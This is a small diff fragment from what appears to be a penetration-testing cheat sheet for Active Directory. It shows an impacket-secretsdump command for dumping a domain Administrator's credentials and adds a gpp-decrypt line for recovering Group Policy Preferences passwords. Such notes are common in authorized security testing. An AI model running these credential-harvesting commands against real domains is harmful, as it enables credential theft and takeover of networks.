@@ -29,4 +29,7 @@ impacket-secretsdump domain/username@ipaddress -just-dc-user Administrator
 (Enter user password at prompt)
 ```
 
+Decrypt GPP Groups.xml Password
+`gpp-decrypt aeshash`
+
 
